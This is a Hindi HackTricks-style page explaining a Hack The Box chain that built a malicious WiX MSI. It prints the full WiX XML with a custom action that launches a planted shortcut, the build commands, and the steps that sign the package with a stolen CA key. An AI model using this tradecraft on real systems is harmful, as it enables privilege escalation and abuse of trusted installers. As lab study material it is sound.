# WiX के साथ Custom-Action MSI बनाना

{{#include ../../banners/hacktricks-training.md}}

इस ऐतिहासिक Hack The Box chain में WiX Toolset v3 का उपयोग करके एक ऐसा MSI बनाया गया था, जिसने पहले से रखी गई `.lnk` file को launch किया। **MSI अपने-आप privileged नहीं होता**: execution उस context में होता है जिसे Windows Installer policy, custom-action attributes और इसे install करने वाला व्यक्ति निर्धारित करते हैं। d scenario में attacker ने एक trusted signing CA भी चुरा लिया और signed MSI को उस folder में रखा जिसे एक अन्य user monitor कर रहा था।<sup>[[1]](#references)[[3]](#references)</sup>

wix MSI usage examples की व्यापक समझ के लिए [इस page](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) को देखना उचित है। यहाँ आपको ऐसे विभिन्न examples मिलेंगे जो wix MSI के usage को demonstrate करते हैं।<sup>[[2]](#references)</sup>

MSI `C:\Users\Public\Desktop\Shortcuts\rick.lnk` को run करता है। मूल WiX v3 XML नीचे सुरक्षित रखा गया है:<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion` न्यूनतम Windows Installer version घोषित करता है और `Compressed="yes"` package को compressed के रूप में चिह्नित करता है। `Stage1` deferred है, लेकिन इसमें `Impersonate="yes"` है, इसलिए यह installing user के impersonated token के साथ चलता है; इस scenario में privilege का change उस privileged user से आया जिसने बाद में MSI खोला, न कि उस attribute से, जो जादुई रूप से SYSTEM privilege प्रदान करता हो।<sup>[[3]](#references)</sup>

Source को `candle.exe` के साथ WiX object में compile करें:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
उस object को `light.exe` के साथ एक MSI में link करें:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### मूल chain में उपयोग किया गया Signing step

Target workflow ने एक compromised internal CA द्वारा signed packages स्वीकार किए। Write-up ने recovered `MyCA.cer`/`MyCA.pvk` से signing certificate derive किया, एक PFX बनाया, और MSI को sign किया:<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
इसके बाद attacker ने signed package को `D:\DEV\MSIs` में रखा और privileged workflow/user द्वारा इसे execute करने की प्रतीक्षा की। Technique को adapt करते समय इस precondition को बनाए रखें: elevated installation path, `AlwaysInstallElevated` जैसी unsafe policy या privileged victim के बिना यह package केवल current user's rights के साथ execute होता है।

## References

- [1] [Hack The Box - Ethereal: Malicious msi बनाना और root प्राप्त करना - 0xRick's Blog](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [एक संक्षिप्त परिचय: WiX के साथ MSI installer बनाना - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Deferred execution custom actions (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
